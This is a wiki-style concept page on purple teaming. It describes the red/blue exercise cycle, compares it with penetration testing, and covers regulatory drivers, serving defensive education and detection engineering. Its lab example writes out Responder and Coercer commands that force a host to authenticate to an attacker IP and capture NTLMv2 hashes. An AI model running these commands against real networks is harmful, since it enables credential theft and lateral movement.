---
title: Purple Teaming
type: concept
platforms: [Windows, Linux, Active Directory]
languages: [PowerShell, Bash]
tasks: [Detection Engineering, Threat Hunting, Hardening, Incident Response]
category: Security Operations
security_domain: Operations
author: RJGProjectz
date_created: 2026-11-03
last_updated: 2026-11-03
tags: [concept, purple-team, red-team, blue-team, adversary-simulation, detection-validation, tiber-eu, mitre-attack, security-testing, threat-emulation]
aliases: [purple team, red team blue team exercise, adversary emulation, collaborative security testing, threat simulation, red blue collaboration, TIBER, atomic red team]
difficulty: intermediate
verified: false
---

# Purple Teaming
> **Created**: 2026-11-03T00:00:00Z
> **Last Modified**: 2026-11-03T00:00:00Z
> **Author**: RJGProjectz

!!! danger "VERIFY BEFORE PRODUCTION USE"
    Remove this block when `verified: true`.

**In one line:** purple teaming is a structured collaboration where a red team simulates real attacks while a blue team validates and improves its detection and response in real time, rather than in isolation.

## What it is

A purple team exercise combines the offensive capability of a red team with the defensive knowledge of a blue team in a cooperative loop. Instead of a black-box penetration test where the blue team only learns the outcome after the fact, purple teaming is a *shared-knowledge* exercise: the red team executes a specific technique, the blue team checks whether it generated an alert, and both teams immediately discuss what worked, what was missed, and how to close the gap.

The name comes from mixing red (attacker) and blue (defender): the two teams operate together with a common objective — measurable improvement in detection coverage — rather than as adversaries.

## How it works

A purple team exercise follows a cycle tied to specific techniques from a threat model or a framework like MITRE ATT&CK:

```text
1. SELECT a technique   →  "We'll test T1187 — Forced Authentication"
2. EXECUTE (red team)   →  Run Responder / Coercer on the lab network
3. CHECK (blue team)    →  Did the SIEM fire? Did anyone get paged?
4. ANALYZE together     →  No alert? Find the gap in logging or correlation
5. IMPROVE              →  Write/tune detection rule, retest, confirm alert fires
6. DOCUMENT             →  Record the technique, outcome, and improvement
7. NEXT technique       →  Repeat until the defined scope is covered
```

This contrasts with a conventional penetration test, which is typically time-boxed, scoped to "find as many vulnerabilities as possible," and delivers a report the blue team reads days or weeks later.

## Why it matters

| | |
| :--- | :--- |
| **MITRE ATT&CK** | The framework provides the shared vocabulary: technique IDs index both red team playbooks and blue team detection queries |
| **What it leads to** | Measured detection coverage improvement; updated SIEM content; validated runbooks |
| **Where defenders meet it** | SOC maturity programs, annual detection reviews, post-breach improvement plans |
| **Regulatory drivers** | TIBER-EU (European banking sector) mandates threat-led purple-team exercises; similar requirements exist in DORA and CBEST |

## Purple team vs penetration test

| Dimension | Penetration test | Purple team exercise |
| :--- | :--- | :--- |
| **Goal** | Find vulnerabilities | Validate and improve detection |
| **Blue team awareness** | Usually unaware | Fully involved |
| **Duration** | Time-boxed (days–weeks) | Ongoing or multi-sprint |
| **Output** | Vulnerability report | Improved detections, playbooks |
| **Timing** | Periodic | Continuous or scheduled sprints |
| **Operator relationship** | Adversarial (realistic) | Collaborative |

## A worked example — coerced authentication

This example from authorized lab environments illustrates the cycle:

**Technique:** T1187 — Forced Authentication via LLMNR/NBT-NS poisoning.

**Red team step:** Start Responder on the attacker host to listen for broadcast name-resolution queries:

```bash
# Lab use only — requires authorization and an isolated network segment
sudo responder -I eth0 -v
```

Then coerce a target host to authenticate:

```bash
# Coercer causes a remote host to send an SMB auth request to the attacker's IP
# Requires at least one domain credential and network access to the target
python3 Coercer.py coerce -u LABUSER -p 'LabPass1' -d lab.local -l ATTACKER_IP -t TARGET_IP
```

**Blue team check:** Does the SIEM alert on LLMNR responses from an unexpected host? Is Event ID 4648 (explicit credential logon) logged for the machine account?

**Outcome without detection tuning:** No alert. Responder captures NTLMv2 hashes silently.

**Improvement:** Write a Sigma rule or SPL query that fires on `LLMNR` responses from non-approved DNS servers, or alert on Event ID 4648 from machine accounts to an unexpected IP.

→ [LLMNR/NBT-NS Poisoning Detection](../../detection/sigma/llmnr-nbtns-poisoning.md)

## OSINT as a purple team input

Before a purple team session, the red team uses OSINT to build a realistic threat model of what an adversary would actually target. The defensive security handbook calls this the "attacker's perspective" that should inform the exercise scope:

- Which services are internet-facing (Shodan, Censys)?
- What credentials or documents have leaked (Have I Been Pwned, Pastebin)?
- What technologies appear in job postings or GitHub commits?

Each OSINT finding maps to a technique the purple team can then test defensively. An exposed RDP service maps to T1190; leaked credentials map to T1078; identified VPN software maps to known CVEs.

→ [OSINT & Active Reconnaissance](../../offensive/osint-active-recon.md)

## Do it

Run the related tooling through the `cc` CLI to find supporting pages:

```bash
cc find "purple team"
cc find "adversary emulation"
cc view offensive/index.md
```

Check your current detection coverage against a known technique set:

```powershell
# Generate a detection-coverage matrix from cc index
python tools/cc.py index
```

## See it

A well-run purple team exercise leaves behind a record of what was tested, what fired, and what did not:

| Artifact | What you want to see |
| :--- | :--- |
| SIEM alert | Rule fires with correct severity on the replayed technique |
| Playbook | Updated with the command syntax from the red team step |
| ATT&CK Navigator layer | Technique IDs shaded: tested / alerting / not alerting |
| Gap backlog | Techniques with no detection flagged for new rule development |

## Detect it

Purple team exercises generate real traffic that defenders need to distinguish from actual attacks:

- Detection: [Sigma — LLMNR/NBT-NS Poisoning](../../detection/sigma/llmnr-nbtns-poisoning.md)
- Detection: [SPL — Lateral Movement SMB](../../detection/spl/lateral-movement-smb.md)
- Hunt: [Threat Hunting](../../tasks/threat-hunting/index.md)
- Respond: [Incident Response](../../tasks/incident-response/index.md)
- Harden: [Hardening](../../tasks/hardening/index.md)

## Related concepts

- [Ethical Hacking](ethical-hacking.md)
- [OSINT](osint.md)
- [Defense in Depth](defense-in-depth.md)
- [Threat Modeling](threat-modeling.md)

## External Resources & White Papers

- [MITRE ATT&CK — CALDERA adversary emulation platform](https://caldera.mitre.org/)
- [TIBER-EU Framework for Threat Intelligence-Based Ethical Red Teaming](https://www.ecb.europa.eu/pub/pdf/other/ecb.tiber_eu_framework.en.pdf)
- [Atomic Red Team — Library of adversary simulation tests](https://github.com/redcanaryco/atomic-red-team)
- [NIST SP 800-53 CA-8 — Penetration Testing](https://csrc.nist.gov/publications/detail/sp/800-53/rev-5/final)
